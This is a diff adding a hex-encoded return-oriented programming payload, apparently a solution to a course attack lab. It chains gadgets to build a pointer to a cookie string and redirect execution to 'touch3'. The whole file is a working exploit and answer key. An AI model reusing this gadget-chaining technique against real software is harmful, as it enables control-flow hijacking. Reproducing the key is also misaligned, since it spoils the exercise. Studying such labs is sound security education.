@@ -1,0 +1,12 @@
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 /* 32 paddings */
+ab 19 40 00 00 00 00 00 /* gadget: popq %rax */
+20 00 00 00 00 00 00 00 /* offset: 32 */
+dd 19 40 00 00 00 00 00 /* gadget: movl %eax,%edx */
+34 1a 40 00 00 00 00 00 /* gadget: movl %edx,%ecx */
+13 1a 40 00 00 00 00 00 /* gadget: movl %ecx,%esi */
+06 1a 40 00 00 00 00 00 /* gadget: movq %rsp,%rax */
+a2 19 40 00 00 00 00 00 /* gadget: movq %rax,%rdi */
+d6 19 40 00 00 00 00 00 /* gadget: lea (%rdi,%rsi,1),%rax */
+a2 19 40 00 00 00 00 00 /* gadget: movq %rax,%rdi */
+fa 18 40 00 00 00 00 00 /* return address of touch3 */
+35 39 62 39 39 37 66 61 /* the cookie: "59b997fa" */
